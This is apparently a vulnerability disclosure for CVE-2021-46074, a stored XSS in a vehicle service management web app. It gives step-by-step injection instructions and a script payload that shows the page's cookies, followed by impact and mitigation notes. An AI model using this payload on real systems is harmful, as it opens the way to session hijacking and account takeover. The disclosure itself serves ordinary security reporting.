# CVE-2021-46074

### Exploit Title: Vehicle Service Management System - 'Settings' Stored Cross Site Scripting (XSS)
### Exploit Author: <a href="https://www.plsanu.com">P.L.Sanu</a>
### CVE: CVE-2021-46074
### CVSS: 4.8 MEDIUM
### References: 
- https://www.plsanu.com/vehicle-service-management-system-settings-stored-cross-site-scripting-xss
- https://nvd.nist.gov/vuln/detail/CVE-2021-46074
- https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2021-46074

### Description:
A Stored Cross Site Scripting (XSS) vulnerability exists in Sourcecodester Vehicle Service Management System 1.0 via the Settings Section in login panel.

### Exploit:
1. Login to the admin panel http://localhost/vehicle_service/admin
2. Navigate to Settings section http://localhost/vehicle_service/admin/?page=system_info
3. Inject the below payload in System Name, System Short Name & About Us input field.

### Payload:
```html
 "><script>alert(document.cookie)</script>
```

4. Click on update button.
5. Malicious javascript code triggered.

### Impact:
An attacker can able to inject malicious JavaScript code in Settings Section.

### Mitigation:
It is recommended to sanitize all the input fields throughout the application.
